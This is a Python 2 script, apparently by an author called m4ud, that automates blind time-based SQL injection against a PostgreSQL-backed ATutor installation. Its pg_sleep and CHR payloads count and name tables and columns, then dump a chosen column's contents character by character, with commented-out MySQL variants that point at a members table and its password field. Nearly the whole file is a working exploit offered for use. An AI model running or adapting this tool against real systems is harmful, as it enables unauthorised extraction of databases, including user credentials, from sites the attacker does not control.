# Atutor PostgreSQL Blind Time-Based SQLi tool
# Author: (m4ud)
#

import requests
import sys
from optparse import OptionParser
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def searchFriends_sqli(ip, injection, inj_str, condTime):
    bool = False
    for j in range(48, 58):
        # now we update the sqli - First REQUESTER - for intial Counting of Tables - ASCII Numeric Range only
        target = "%s%s%s" % (ip, injection, inj_str.replace("[M4UD]", str(j)))
        time_started = time.time()
        r = requests.get(target, verify=False)
        time_finished = time.time()
        time_taken = time_finished - time_started
        if time_taken > int(condTime):
            return j

def getTables_sqli(ip, injection, inj_str, condTime):
    # SECOND REQUESTER for extracting TABLE_NAMES - ALPHA-NUMERIC ascii based extraction
    bool = False
    for j in range(32, 126):
        # now we update the sqli

        target = "%s%s%s" % (ip, injection, inj_str.replace("[M4UD]", str(j)))
        time_started = time.time()
        r = requests.get(target, verify=False)
        time_finished = time.time()
        time_taken = time_finished - time_started
        if time_taken > int(condTime):
            bool = True
            return j

class blind:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
        tableN = ""
        tableJ = ""
        tableCL = ""
        condTime = options.condTime
        self.condTime = condTime
        injection = options.injection
        self.injection = injection
        target = options.target
        ip = target
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip


    def getTables_number(self):
        for i in range(1, 4):
            injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(COUNT(table_name)::text,"+str(i)+",1))=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END/**/from/**/information_schema.tables;"

#            injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(COUNT(table_name),"+str(i)+",1))="+ "[M4UD]" +"/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.tables)"+ "%23"
            extracted_char = chr(searchFriends_sqli(self.ip, self.injection, injection_string, self.condTime))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)

        for o in range(0, int(self.tableN)):
            print "\r\n==========================="
            print "[+] Tables Name Char Count\r\n"
            self.getTablesChar_number(o)

    def getTablesChar_number(self, o):
        for y in range(1, 3):
            try:
                try:
                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(LENGTH(table_name)::text,"+str(y)+",1)/**/from/**/information_schema.tables/**/LIMIT/**/1/**/OFFSET/**/"+str(o)+")=CHR("+"[M4UD]"+")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;"

#                    injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(CHAR_LENGTH(table_name)," + str(y) + ",1))="+ "[M4UD]" +"/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.tables/**/ORDER/**/BY/**/table_name/**/LIMIT/**/"+ str(o) +",1)%23"
                    extracted_char = chr(searchFriends_sqli(self.ip, self.injection, injection_string, self.condTime))
                    sys.stdout.write(extracted_char)
                    sys.stdout.flush()
                    self.tableCL += str(extracted_char)

                except Exception:
                    pass
            except KeyboardInterrupt:
                print "\r\n[-] Bye...."
                sys.exit(0)

        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n========================="
        print "[+] Dumping Table Names\r\n"
        #print "TableCl value is: " + str(tableCL)
        self.dropTables_name(o, tableCL)
        self.tableCL = ""
        tableCL = ""


    def dropTables_name(self, o, tableCL):
        for x in range(1, int(tableCL)):
            try:
                try:
                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING((table_name),"+str(x)+",1)/**/from/**/information_schema.tables/**/LIMIT/**/1/**/OFFSET/**/"+str(o)+")=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;"
#                    injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(table_name," + str(x) + ",1))=" + "[M4UD]" + "/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.tables/**/ORDER/**/BY/**/table_name/**/LIMIT/**/" + str(o) + ",1)" + "%23"
                    extracted_char = chr(getTables_sqli(self.ip, self.injection, injection_string, self.condTime))
                    sys.stdout.write(extracted_char)
                    sys.stdout.flush()
                    tableJ += str(extracted_char)
                except Exception:
                    pass
            except KeyboardInterrupt:
                print "\r\n[-] Bye..."
                sys.exit(0)


class blindC:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
        tableN = ""
        tableJ = ""
        tableCL = ""
        condTime = options.condTime
        self.condTime = condTime
        injection = options.injection
        self.injection = injection
        target = options.target
        ip = target
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip
        self.tableName = options.tableName
        tableName = self.tableName


    def getColumns_number(self, tableName):
        print "==============================="
        print "[+] Counting number of Columns "
        for i in range(1, 2):
            try:
                injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(COUNT(column_name)::text," + str(i) + ",1))=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END/**/from/**/information_schema.columns/**/where/**/table_name=$$" + str(self.tableName) + "$$;"

 #               injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(COUNT(column_name),"+ str(i) +",1))=" + "[M4UD]" + "/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName) + "')" + "%23"
                extracted_char = chr(searchFriends_sqli(self.ip, self.injection, injection_string, self.condTime))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableN += str(extracted_char)
            except KeyboardInterrupt:
                print "\r\n[-] Bye..."
                sys.exit(0)

        for o in range(0, int(self.tableN)):
            print "\r\n============================"
            print "[+] Columns Name Char Count\r\n"
            self.getColumnChar_number(o, tableName)

    def getColumnChar_number(self, o, tableName):
        for y in range(1, 3):
            try:
                try:
                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(LENGTH(column_name)::text,"+str(y)+",1)/**/from/**/information_schema.columns/**/WHERE/**/table_name=$$"+str(self.tableName)+"$$/**/LIMIT/**/1/**/OFFSET/**/"+str(o)+")=CHR("+"[M4UD]"+")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;"
 
#                    injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(CHAR_LENGTH(column_name)," + str(y) + ",1))=" +"[M4UD]"+ "/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.columns/**/where/**/table_name='AT_members'/**/ORDER/**/BY/**/column_name/**/LIMIT/**/" + str(o) + ",1)" + "%23"

                    extracted_char = chr(searchFriends_sqli(self.ip, self.injection, injection_string, self.condTime))
                    sys.stdout.write(extracted_char)
                    sys.stdout.flush()
                    self.tableCL += str(extracted_char)

                except Exception:
                    pass
            except KeyboardInterrupt:
                print "\r\n[-] Bye..."
                sys.exit(0)

        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n================================================="
        print "[+] Enumarating Column Names from Table:"+str(self.tableName)+"\r\n"
#        print "TableCl value is: " + str(tableCL)
        self.dropColumn_name(o, tableCL, tableName)
        self.tableCL = ""
        tableCL = ""


    def dropColumn_name(self, o, tableCL, tableName):
        for x in range(1, int(tableCL)):
            try:
                try:
                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING((column_name),"+str(x)+",1)/**/from/**/information_schema.columns/**/where/**/table_name=$$"+str(self.tableName)+"$$/**/LIMIT/**/1/**/OFFSET/**/"+str(o)+")=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;" 
#                    injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring((column_name)," + str(x) + ",1))=" + "[M4UD]" + "/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName) + "'/**/ORDER/**/BY/**/column_name/**/LIMIT/**/" + str(o) + ",1)" + "%23"
                    extracted_char = chr(getTables_sqli(self.ip, self.injection, injection_string, self.condTime))
                    sys.stdout.write(extracted_char)
                    sys.stdout.flush()
                    tableJ += str(extracted_char)
                except Exception:
                    pass
            except KeyboardInterrupt:
                print "\r\n[-] Bye..."
                sys.exit(0)


class blindD:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
        tableN = ""
        tableJ = ""
        tableCL = ""
        condTime = options.condTime
        self.condTime = condTime
        injection = options.injection
        self.injection = injection
        target = options.target
        ip = target
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip
        self.tableName = options.tableName
        tableName = self.tableName
        self.columnName = options.columnName
        columnName = self.columnName
        self.dbName = options.dbName
        dbName = self.dbName


    def getDumpColumns_number(self, columnName, tableName, dbName):
        print "=============================="
        print "[+] Getting number of entries\r\n"
        for i in range(1, 2):
            injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(COUNT("+str(self.columnName)+")::text," + str(i) + ",1))=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END/**/from/**/"+str(self.tableName)+";"

##           injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(COUNT(column_name)::text," + str(i) + ",1))=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END/**/from/**/information_schema.columns/**/where/**/table_name=$$" + str(self.tableName) + "$$/**/AND/**/column_name=$$" + str(self.columnName) + "$$;"
#            injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(COUNT(column_name)," + str(i) + ",1))=" + "[M4UD]" + "/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName)  +"'/**/AND/**/column_name='" + str(self.columnName)  + "')" + "%23"
            extracted_char = chr(searchFriends_sqli(self.ip, self.injection, injection_string, self.condTime))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)

        for o in range(0, int(self.tableN)):
            print "\r\n====================================================="
            print "[+] Counting Column:"+str(self.columnName)+" number of Characters\r\n"
            self.getDumpChar_number(o, tableName, columnName, dbName)

    def getDumpChar_number(self, o, tableName, columnName, dbName):
        for y in range(1, 3):
            try:
                try:
                
                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(LENGTH("+str(self.columnName)+")::text,"+str(y)+",1)/**/from/**/"+str(self.tableName)+"/**/LIMIT/**/1/**/OFFSET/**/"+str(o)+")=CHR("+"[M4UD]"+")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;"

#                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(LENGTH(column_name)::text,"+str(y)+",1)/**/from/**/information_schema.columns/**/WHERE/**/table_name=$$"+str(self.tableName)+"$$/**/AND/**/column_name=$$"+str(self.columnName)+"$$)=CHR("+"[M4UD]"+")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;"
#                    injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(CHAR_LENGTH("+ str(columnName) + ")," + str(y) + ",1))=" + "[M4UD]"  + "/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName) + "'/**/limit/**/" + str(o) + ",1)" + "%23"
                    extracted_char = chr(searchFriends_sqli(self.ip, self.injection, injection_string, self.condTime))
                    sys.stdout.write(extracted_char)
                    sys.stdout.flush()
                    self.tableCL += str(extracted_char)

                except Exception:
                    pass
            except KeyboardInterrupt:
                print "\r\n[-] Bye..."
                sys.exit(0)

        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n========================================================================"
        print "[+] Dumping Column:" +str(self.columnName)+ " from Table:" + str(self.tableName)+ " from Database:"+str(self.dbName)+ "\r\n"
        #print "TableCl value is: " + str(tableCL)
        self.dumpName(o, tableCL, tableName, columnName, dbName)
        self.tableCL = ""
        tableCL = ""


    def dumpName(self, o, tableCL, tableName, columnName, dbName):
        for x in range(1, int(tableCL)):
            try:
                try:
                    injection_string = ";SELECT/**/CASE/**/WHEN/**/(SELECT/**/SUBSTRING(("+str(self.columnName)+"),"+str(x)+",1)/**/from/**/"+str(tableName)+"/**/LIMIT/**/1/**/OFFSET/**/"+str(o)+")=CHR(" + "[M4UD]" + ")/**/THEN/**/pg_sleep(5)/**/ELSE/**/NULL/**/END;" 
#                    injection_string = "/**/or/**/(select/**/case/**/when/**/ascii(substring(password,"+str(x)+",1))="+ "[M4UD]" +"/**/then/**/sleep(4)/**/else/**/NULL/**/end/**/from/**/" + str(self.dbName)+ "." + str(self.tableName) + ")%23"
#                    injection_string = "/**/or/**/(select/**/(ascii(substring(("+ str(self.columnName) +"),"+ str(x) +",1)))/**/from/**/"+ str(self.dbName)+"."+str(self.tableName)+"/**/limit/**/" + str(o) + ",1)="+ "[M4UD]" +"%23"
                    extracted_char = chr(getTables_sqli(self.ip, self.injection, injection_string, self.condTime))
                    sys.stdout.write(extracted_char)
                    sys.stdout.flush()
                    tableJ += str(extracted_char)
                except Exception:
                    pass
            except KeyboardInterrupt:
                print "\r\n[-] Bye..."
                sys.exit(0)


def main():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")
    parser.add_option("-i", "--injection", dest="injection", help="[ Requeired ] Speacial character used in injection")
    parser.add_option("-c", "--condtime", dest="condTime", default="4",help="[ Requeired ] String to use as positive conditional verification of the injection!")
    parser.add_option("-T", "--table", dest="tableName", help="Table Name")
    parser.add_option("-C", "--column", dest="columnName", help="Column Name")
    parser.add_option("-D", "--database", dest="dbName", help="Database Name")
    parser.add_option("-e", "--enumerate", dest="enum", help="Enumerate DB Tables")
    (options, args) = parser.parse_args()

    if options.tableName and options.columnName and options.dbName and options.injection:
        print "\r\n(m4ud) PostgreSQL Blind Time-Based sql-jutsu \r\n"
        print "\r\n[*] Dumping Goods"
        #injection = options.injection
        columnName = options.columnName
        tableName = options.tableName
        dbName = options.dbName
#        dump = blindD(options).getDumpChar_number(tableName, columnName, dbName)
        dump = blindD(options).getDumpColumns_number(columnName, tableName, dbName)
    elif options.tableName and not options.columnName and options.injection:
        print "\r\n(m4ud) PostgreSQL Blind Time-Based sql-jutsu \r\n"
        print "[*] Dumping Columns"
        injection = options.injection
        columnName = options.columnName
        tableName = options.tableName
        columns = blindC(options).getColumns_number(tableName)
    elif options.enum and options.injection:
        print "\r\n(m4ud) PostgreSQL Blind Time-Based sql-jutsu \r\n"
        print "===================================================="
        print "[+] Retrieving numbers of tables in the Database...."
        tableN = blind(options).getTables_number()
    
####    tableN = blind().getTables_number()


    print "\n(+) done!"

if __name__ == "__main__":
    main()
